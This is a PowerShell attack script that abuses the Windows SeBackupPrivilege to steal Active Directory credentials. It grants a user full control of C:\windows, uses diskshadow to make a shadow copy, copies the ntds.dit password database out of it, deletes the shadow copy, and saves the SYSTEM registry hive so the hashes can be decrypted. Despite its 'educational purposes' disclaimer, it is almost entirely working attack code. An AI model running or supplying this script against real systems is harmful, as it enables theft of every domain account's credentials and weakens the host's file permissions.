#PS Script to use the SeBackupPrivilege for extracting the ntds.dit file and reg system file
#Purely for educational purposes. Illegal purposes are not intended.
#Not completely my ideas. Taken from a few sources and put together in one place.

$current_path = Get-Location

#Uncomment the lines below if https connenction is allowed or working, otherwise download the dlls and save on the machine
#Invoke-WebRequest -Uri "https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll" -OutFile "SeBackupPrivilegeUtils.dll"
#Invoke-WebRequest -Uri "https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll" -OutFile "SeBackupPrivilegeCmdLets.dll"

Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege

#set ACL in the windows folder
$path = "C:\windows\"
$user = "DOMAIN\USER"     #EDIT THIS LINE BEFORE USAGE
$acl = get-acl -Path $path
$acl_rule = $user,'FullControl','ContainerInherit,ObjectInherit','None','Allow'
$access_rule = New-Object System.Security.AccessControl.FileSystemAccessRule $acl_rule
$acl.AddAccessRule($access_rule)
Set-Acl -Path $path -AclObject $acl

#Creating a script file for DiskShadow
"set metadata C:\windows\temp\metadata.cab" | Out-File script.txt -encoding ascii
"set context persistent nowriters" | Out-File script.txt -encoding ascii -append
"begin backup" | Out-File script.txt -encoding ascii -append
"add volume c: alias mydrive" | Out-File script.txt -encoding ascii -append
"create" | Out-File script.txt -encoding ascii -append
"expose %mydrive% k:" | Out-File script.txt -encoding ascii -append

#Using DiskShadow to get create a Volume Shadow Copy
cd /windows/system32
cmd /c "diskshadow.exe /s $current_path\\script.txt"
Copy-FileSeBackupPrivilege k:\windows\ntds\ntds.dit $current_path\\ntds.dit -Overwrite
cd $current_path
del script.txt

#Cleanup 
"delete shadows exposed k:" | Out-File script.txt -encoding ascii -append
"exit" | Out-File script.txt -encoding ascii -append
cd /windows/system32
cmd /c "diskshadow.exe /s $current_path\\script.txt"
cd $current_path
del script.txt

#Get the system registry hive
cmd /c "reg.exe save hklm\system .\system.bak"

